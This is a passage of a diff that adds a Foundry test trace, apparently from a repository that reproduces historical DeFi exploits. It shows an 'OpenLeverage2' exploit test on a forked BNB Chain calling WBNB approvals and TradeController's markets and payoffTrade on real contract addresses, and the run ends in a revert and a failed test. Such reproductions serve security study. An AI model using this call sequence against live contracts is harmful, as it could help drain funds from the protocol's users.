+    │   │   │   └─ ← [Return] 
+    │   │   ├─ [717] WBNB::allowance(OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], 0x6BC99aa7412f7Af5770AEE7Dcf81723730DB33f2) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [2420] WBNB::approve(0x6BC99aa7412f7Af5770AEE7Dcf81723730DB33f2, 0)
+    │   │   │   ├─ emit Approval(owner: OPBorrowingDelegator: [0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47], spender: 0x6BC99aa7412f7Af5770AEE7Dcf81723730DB33f2, value: 0)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  emit topic 0: 0xdb82e1381d96059d471eb24fae1327014620c977a39fa044ca42ff17a66c1b94
+    │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000001800000000000000000000000000000000000000000000000000000000000000010000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000f42400000000000000000000000000000000000000000000000000034a01bc8daa5ec000000000000000000000000000000000000000000000001cb887c4e828cb3ec0000000000000000000000000000000000000000000000000000000000000021000000000000000000000000000000000000000001e6fbc6c413a95d24792b45
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [0] VM::rollFork(37470331 [3.747e7])
+    │   └─ ← [Return] 
+    ├─ [18562] TradeController::markets(24) [staticcall]
+    │   ├─ [15735] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::markets(24) [delegatecall]
+    │   │   └─ ← [Return] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617, 0xa75323e651e0EAC7756003F7E0c3Fc8967FB1925, WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 450, 0, 5, 0x74e4Fb918480D57718Ad1e46113F70a110ff7Fbe, 57549311202102038545 [5.754e19], 10564809865456566322330 [1.056e22]
+    │   └─ ← [Return] 0x7c5e04894410e98b1788fbdB181FfACbf8e60617, 0xa75323e651e0EAC7756003F7E0c3Fc8967FB1925, WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BUSDT: [0x55d398326f99059fF775485246999027B3197955], 450, 0, 5, 0x74e4Fb918480D57718Ad1e46113F70a110ff7Fbe, 57549311202102038545 [5.754e19], 10564809865456566322330 [1.056e22]
+    ├─ [26135] TradeController::payoffTrade(24, true)
+    │   ├─ [25356] 0x88a149aC891AF29e0b59616af8D146a58e17Fbc0::payoffTrade(24, true) [delegatecall]
+    │   │   ├─ [2534] WBNB::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   └─ ← [Return] 161417993195347131951 [1.614e20]
+    │   │   ├─ [2531] BUSDT::balanceOf(TradeController: [0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4]) [staticcall]
+    │   │   │   └─ ← [Return] 81496001326996673315727 [8.149e22]
+    │   │   └─ ← [Revert] revert: HI0
+    │   └─ ← [Revert] revert: HI0
+    └─ ← [Revert] revert: HI0
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 749.49ms (339.92ms CPU time)
+
+Ran 2 test suites in 1.08s (1.12s CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)
+
+Failing tests:
+Encountered 1 failing test in src/test/2024-04/OpenLeverage2_exp.sol:ContractTest
+[FAIL. Reason: revert: HI0] testExploit() (gas: 2135212)
+
+Encountered a total of 1 failing tests, 1 tests succeeded
